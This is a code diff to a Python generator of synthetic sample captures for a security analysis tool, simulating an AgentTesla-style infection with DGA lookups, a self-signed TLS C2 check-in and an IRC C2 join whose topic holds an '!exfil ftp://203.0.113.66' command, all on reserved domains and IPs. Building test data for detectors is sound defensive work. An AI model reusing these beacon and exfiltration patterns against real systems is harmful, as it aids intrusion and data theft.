@@ -8,8 +8,9 @@ this source - means no file in the container image contains the
 signature for a scanner to flag or quarantine. It only exists in full in
 an analysis directory once someone loads a sample.
 
-All four use only reserved .example domains and documentation-range IPs
-(RFC 2606, RFC 5737), and tell one story (docs/usage/analyzing-files.md):
+All four use only reserved .example domains, documentation-range public
+IPs (RFC 2606, RFC 5737) and private ones for the victim's network
+(RFC 1918), and tell one story (docs/usage/analyzing-files.md):
 a phishing email delivers a macro document (email); opening it on
 Jordan's workstation starts PowerShell, which downloads a payload that
 persists and harvests saved credentials (log); the download and the
@@ -235,6 +236,117 @@ def build_log_sample():
 _VICTIM_MAC, _GATEWAY_MAC = bytes.fromhex('0050569a4c12'), bytes.fromhex('00163e1d2b01')
 _MSS = 1448
 
+# The workstation's own name and the LAN names it looks for - the chatter
+# below is normal Windows background noise, none of it parsed by Suricata,
+# so it's what the tshark metadata view surfaces that Suricata's won't.
+_WORKSTATION_NB = 'FIN-WS-0412'
+_LLMNR_MCAST, _SSDP_MCAST = '224.0.0.252', '239.255.255.250'
+_SUBNET_BCAST = '10.20.4.255'  # the /24 the victim (10.20.4.12) sits on
+_RESOLVER = '10.20.4.1'        # the workstation's internal DNS resolver
+
+# The dropped payload's domain-generation-algorithm beacon: a dozen
+# algorithmically-generated names it tries in turn to find its live C2.
+# High character-spread, no vowels and long enough to read as encoded, so
+# the DNS Heuristics tab flags each as a possible DGA; under the reserved
+# .example TLD (RFC 2606) so the sample points at no real domain. Generated
+# once (random.Random(20260203)) and pinned here so the sample never drifts.
+_DGA_DOMAINS = (
+    'l6rm390zn5x8f1.example', 'z825rb3pcdnrg6.example', 'mcxfpk58jw6q2w.example',
+    'z09ctjfdj1swrg.example', '2g6xqk97frxhnb.example', 'g7nw51437089ht.example',
+    'shxv0mcn46d383.example', 'd3vfnj0mz6rh8p.example', 'h4c9rvt0qff6nd.example',
+    'h9lvz48bnntr0s.example', 'nvjz7161slpcqb.example', 'wvnzfpcdh38jkc.example',
+)
+
+
+def _dns_name(name):
+    return b''.join(bytes([len(p)]) + p.encode() for p in name.split('.')) + b'\0'
+
+
+def _dns_message(txid, qname, qtype=1, answer=None, rcode=0):
+    """A DNS message: one question, type A by default. A response (an answer
+    given, or a non-zero rcode such as 3 for NXDOMAIN) sets the response flags
+    and appends the A record. LLMNR shares this format - tshark decodes it as
+    LLMNR by its port (5355); DNS proper is Suricata's."""
+    is_response = answer is not None or rcode
+    flags = 0x0100 | (0x8180 if is_response else 0) | rcode  # 0x0100: recursion desired
+    msg = struct.pack('!HHHHHH', txid, flags, 1, 1 if answer else 0, 0, 0)
+    msg += _dns_name(qname) + struct.pack('!HH', qtype, 1)
+    if answer:  # a single A record, name compressed to the question (0xc00c)
+        msg += b'\xc0\x0c' + struct.pack('!HHIH', 1, 1, 300, 4) + socket.inet_aton(answer)
+    return msg
+
+
+def _ext(ext_type, data):
+    return struct.pack('!HH', ext_type, len(data)) + data
+
+
+def _tls_record(content_type, body, version=b'\x03\x03'):
+    return bytes([content_type]) + version + struct.pack('!H', len(body)) + body
+
+
+def _tls_handshake(msg_type, body):
+    return bytes([msg_type]) + struct.pack('!I', len(body))[1:] + body
+
+
+def _certificate_message(cert_der):
+    """A TLS Certificate handshake body carrying one certificate (each length
+    a 24-bit field): the list length, then the cert's length and its DER."""
+    one = struct.pack('!I', len(cert_der))[1:] + cert_der
+    return struct.pack('!I', len(one))[1:] + one
+
+
+# A TLS 1.2 ClientHello and ServerHello for the C2 check-in. 1.2, not 1.3, so
+# the server's certificate crosses the wire readable and Suricata can log its
+# subject and issuer. The SNI matches the certificate's name, so only the
+# self-signed Finding fires (not a name mismatch).
+_C2_SNI = b'update-check.example'
+_CLIENT_HELLO_BODY = (
+    b'\x03\x03' + bytes(range(32)) + b'\x00'                          # version, random, no session id
+    + struct.pack('!H', 2) + struct.pack('!H', 0xc02f) + b'\x01\x00'  # one cipher (ECDHE-RSA-AES128-GCM), null compression
+    + struct.pack('!H', len(_ext(0x0000, struct.pack('!HBH', len(_C2_SNI) + 3, 0, len(_C2_SNI)) + _C2_SNI)))
+    + _ext(0x0000, struct.pack('!HBH', len(_C2_SNI) + 3, 0, len(_C2_SNI)) + _C2_SNI))  # server_name (SNI)
+_SERVER_HELLO_BODY = (
+    b'\x03\x03' + bytes(range(100, 132)) + b'\x00'                    # version, random, no session id
+    + struct.pack('!H', 0xc02f) + b'\x00' + struct.pack('!H', 0))     # chosen cipher, null compression, no extensions
+
+# The C2's self-signed certificate (issuer == subject == CN=update-check.example),
+# valid 2026-01-01 to 2027-01-01 so it covers the capture's date and only the
+# self-signed Finding fires. A real, well-formed X.509 so Suricata parses it,
+# generated once with pyca/cryptography and pinned here as DER (the app has no
+# crypto dependency at runtime, and the sample must stay byte-for-byte stable).
+_C2_TLS_CERT = bytes.fromhex(
+    '308202e0308201c8a00302010202054147454e54300d06092a864886f70d01010b0500301f311d301b06035504030c147570646174652d636865636b'
+    '2e6578616d706c65301e170d3236303130313030303030305a170d3237303130313030303030305a301f311d301b06035504030c147570646174652d'
+    '636865636b2e6578616d706c6530820122300d06092a864886f70d01010105000382010f003082010a0282010100a5ee0e4ebdf3616ad114d9b1f3dd'
+    'e00d669f82a3d1ac038664b7ee55a40bdcabf320634031f9c5cbde00a92a62c01cf0bc3d12f800bd65e5355adc4a9cb7ac5af5f125ebe8767865d333'
+    'c393391ad90003ee8e5484aa764666d70e40c662a15ff875fcb3541949d73d4ac4c143824958839c42b2ca44473e983d3d21946e1308e25d44316279'
+    '1d97aa33c6ef0d47255b561002800492f2b634865cb46cabaf1887f273670cdb782effd4d71f78a43a5e03a771d32ea7ad07e366ff2abfb5f731d3f5'
+    'c0e80363356dd2333c3872f5b7d4fede6556b5b8d51aef39ad2da9c223b58ffedd747185716a698340f4a989f82236c80a05f07b545886f41d927a06'
+    '460d0203010001a3233021301f0603551d110418301682147570646174652d636865636b2e6578616d706c65300d06092a864886f70d01010b050003'
+    '820101001b5e299aa4fd254319b9f3815f87457129cdb9149eb6f293d69c28a0c294b2040a9cc3747b2748550a8140e05ab02e52bf527c25c0dba2fa'
+    'bc9c22897f32a25ea39560f0f332b928e9cc0fbceb4ff412006fbaf6953fca6babb38c9266f8bff0f21ae320d0b45d80b9c3b53084731ac9c47f5616'
+    '2116a32fc5d107595e45d1243743596c9de73dbe0c6b7cc8989fbd069ff589132fd32cd1ff07245eadae51f95ed04e76e41e5fae92dfb7eb103e9320'
+    '29f9287a8f1a4590093d0bdb0c6979cba9d9e075c0d0a65086d1220845a3b40e68f81fe2fbda382c7b04c3c16ce9340e87f513ed1dbd9958bc57af48'
+    '681546fe96826adddeaa71b3e23a010a6e128a7c')
+
+
+def _nbns_name(name, suffix):
+    """A NetBIOS name: the 15-char name plus a one-byte suffix, each nibble
+    half-ASCII-encoded the way NBNS carries it on the wire."""
+    raw = name.upper().ljust(15)[:15].encode() + bytes([suffix])
+    encoded = b''.join(bytes([0x41 + (c >> 4), 0x41 + (c & 0xf)]) for c in raw)
+    return b'\x20' + encoded + b'\x00'
+
+
+def _nbns(txid, flags, name, suffix, additional_addr=None, ttl=300000):
+    """A NetBIOS name-service message - a query or a name registration. A
+    registration carries the registering host's own address as an additional
+    record. Suricata doesn't parse NBNS; tshark decodes it by its port (137)."""
+    ar = (b'\xc0\x0c' + struct.pack('!HHIH', 0x20, 1, ttl, 6) + b'\x00\x00'
+          + socket.inet_aton(additional_addr)) if additional_addr else b''
+    head = struct.pack('!HHHHHH', txid, flags, 1, 0, 0, 1 if ar else 0)
+    return head + _nbns_name(name, suffix) + struct.pack('!HH', 0x20, 1) + ar
+
 
 def _checksum(data):
     if len(data) % 2:
@@ -265,6 +377,81 @@ class _Capture:
         smac, dmac = (_VICTIM_MAC, _GATEWAY_MAC) if src == _VICTIM else (_GATEWAY_MAC, _VICTIM_MAC)
         self.t += dt
         self.packets.append((self.t, dmac + smac + b'\x08\x00' + ip + hdr + payload))
+
+    def _udp(self, src, dst, sport, dport, payload, ttl=64, dt=0.01):
+        """A UDP datagram. The destination MAC follows from the address: the
+        all-ones broadcast, the IPv4 multicast mapping (01:00:5e + the low 23
+        bits), or - for a unicast flow - the gateway/victim by direction."""
+        s, d = socket.inet_aton(src), socket.inet_aton(dst)
+        udp = struct.pack('!HHHH', sport, dport, 8 + len(payload), 0) + payload
+        pseudo = s + d + struct.pack('!BBH', 0, 17, len(udp))
+        udp = udp[:6] + struct.pack('!H', _checksum(pseudo + udp) or 0xffff) + udp[8:]
+        ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + len(udp), self.rng.randint(1, 65535),
+                         0, ttl, 17, 0, s, d)
+        ip = ip[:10] + struct.pack('!H', _checksum(ip)) + ip[12:]
+        if dst == '255.255.255.255' or dst.endswith('.255'):
+            smac, dmac = _VICTIM_MAC, b'\xff' * 6
+        elif 224 <= d[0] <= 239:  # IPv4 multicast
+            smac, dmac = _VICTIM_MAC, b'\x01\x00\x5e' + bytes([d[1] & 0x7f, d[2], d[3]])
+        else:
+            smac, dmac = (_VICTIM_MAC, _GATEWAY_MAC) if src == _VICTIM else (_GATEWAY_MAC, _VICTIM_MAC)
+        self.t += dt
+        self.packets.append((self.t, dmac + smac + b'\x08\x00' + ip + udp))
+
+    def chatter(self):
+        """The workstation's normal Windows name-resolution and discovery
+        broadcasts/multicasts before the attack traffic - LLMNR and NBNS
+        name lookups and an SSDP device search, none parsed by Suricata."""
+        # NBNS: the workstation registering its own name (retransmitted, as
+        # Windows does), then an unanswered query for a file server.
+        reg = _nbns(0x8a01, 0x2910, _WORKSTATION_NB, 0x20, additional_addr=_VICTIM)
+        for _ in range(3):
+            self._udp(_VICTIM, _SUBNET_BCAST, 137, 137, reg, ttl=128, dt=0.3)
+        self._udp(_VICTIM, _SUBNET_BCAST, 137, 137, _nbns(0x8a02, 0x0110, 'FILE-SRV-01', 0x20), ttl=128, dt=0.3)
+        # LLMNR: the proxy-autoconfig lookup and the same file server by name.
+        self._udp(_VICTIM, _LLMNR_MCAST, 54120, 5355, _dns_message(0x4a01, 'wpad'), ttl=1, dt=0.3)
+        self._udp(_VICTIM, _LLMNR_MCAST, 54121, 5355, _dns_message(0x4a02, 'file-srv-01'), ttl=1, dt=0.3)
+        # SSDP: an M-SEARCH discovering UPnP devices on the LAN.
+        self._udp(_VICTIM, _SSDP_MCAST, 54130, 1900,
+                  b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\n'
+                  b'ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n', ttl=1, dt=0.3)
+
+    def beacon(self):
+        """After the payload is dropped, its post-exploitation beacon: a DGA
+        burst (a dozen algorithmically-generated domains, most NXDOMAIN, one
+        resolving to the C2) that lights up the DNS Heuristics tab, a C2
+        check-in over TLS whose self-signed certificate Suricata flags as a
+        Finding, and an IRC C2 join - a protocol tshark identifies but neither
+        Suricata nor shark_protocols parses, so it becomes a connection row
+        (conn_irc) in the Connections section. All attacker traffic, run from
+        the workstation."""
+        # DGA domain-generation beacon, one query each over one stub->resolver
+        # flow (as a Windows stub resolver reuses its source port for a burst).
+        for i, domain in enumerate(_DGA_DOMAINS):
+            txid = 0x6000 + i
+            self._udp(_VICTIM, _RESOLVER, 51812, 53, _dns_message(txid, domain), ttl=128, dt=0.2)
+            # all fail but the last, which points the payload at its live C2
+            answer = _C2 if domain is _DGA_DOMAINS[-1] else None
+            rcode = 0 if answer else 3  # NXDOMAIN
+            self._udp(_RESOLVER, _VICTIM, 53, 51812, _dns_message(txid, domain, answer=answer, rcode=rcode),
+                      ttl=64, dt=0.03)
+        # TLS C2 check-in whose self-signed certificate is the Finding.
+        client_hello = _tls_record(22, _tls_handshake(1, _CLIENT_HELLO_BODY), version=b'\x03\x01')
+        server_flight = _tls_record(22, _tls_handshake(2, _SERVER_HELLO_BODY)
+                                    + _tls_handshake(11, _certificate_message(_C2_TLS_CERT))
+                                    + _tls_handshake(14, b''))  # ServerHelloDone
+        self.session(51801, 443, [(True, client_hello), (False, server_flight)], gap=2.0)
+        # IRC C2: the bot registers and joins its channel, where the operator's
+        # topic carries a command. tshark decodes IRC; neither Suricata nor
+        # shark_protocols parses it, so it lands as a conn_irc connection row.
+        self.session(51802, 6667, [
+            (False, b':irc.c2.example NOTICE AUTH :*** Looking up your hostname\r\n'),
+            (True, b'NICK win-' + _WORKSTATION_NB.encode() + b'\r\n'),
+            (True, b'USER bot 0 * :' + _WORKSTATION_NB.encode() + b'\r\n'),
+            (False, b':irc.c2.example 001 win-' + _WORKSTATION_NB.encode() + b' :Welcome\r\n'),
+            (True, b'JOIN #ops\r\n'),
+            (False, b':irc.c2.example 332 win-' + _WORKSTATION_NB.encode() + b' #ops :!exfil ftp://203.0.113.66\r\n'),
+        ], gap=1.5)
 
     def session(self, cport, sport, steps, gap):
         """A TCP connection from the workstation: handshake, each
@@ -319,9 +506,17 @@ def build_pcap_sample():
     named the way AgentTesla names them (PW_<user>-<host>_<timestamp>.html).
     Fires ET Open's AgentTesla FTP exfiltration rule and its executable-
     download rules (5 alerts with the built-in ruleset when written), and
-    Suricata's extracted copy of the payload gets YARA hits."""
+    Suricata's extracted copy of the payload gets YARA hits.
+    It opens with the workstation's normal Windows LAN chatter (LLMNR, NBNS
+    and SSDP) - none of it parsed by Suricata, so it populates the tshark
+    metadata view with protocols Suricata's own analysis leaves out. After
+    the download, the payload beacons: a DGA burst of a dozen generated
+    domains (DNS Heuristics flags them), a TLS C2 check-in whose self-signed
+    certificate is a Finding, and an IRC C2 join that becomes a connection
+    row (conn_irc) since tshark names it but nothing parses it."""
     cap = _Capture(start=1770108270.0)  # 2026-02-03T08:44:30Z, matching the log sample
     payload = build_binary_sample()
+    cap.chatter()  # the workstation's normal Windows LAN chatter (tshark decodes it, Suricata doesn't)
     cap.session(51733, 80, [
         (True, b'GET /update.bin HTTP/1.1\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\n'
                b'Pragma: no-cache\r\nAccept: */*\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n'
@@ -329,6 +524,7 @@ def build_pcap_sample():
         (False, b'HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: application/octet-stream\r\n'
                 b'Content-Length: %d\r\nConnection: close\r\n\r\n' % len(payload) + payload),
     ], gap=1.0)
+    cap.beacon()  # the dropped payload's DGA lookups (DNS Heuristics) and self-signed TLS C2 (a Finding)
     report = (b'<html><head><title>PW_jordan.lee-FIN-WS-0412</title></head><body>'
               b'<h2>Recovered credentials - FIN-WS-0412 / jordan.lee</h2><table>'
               b'<tr><th>URL</th><th>User</th><th>Password</th></tr>'
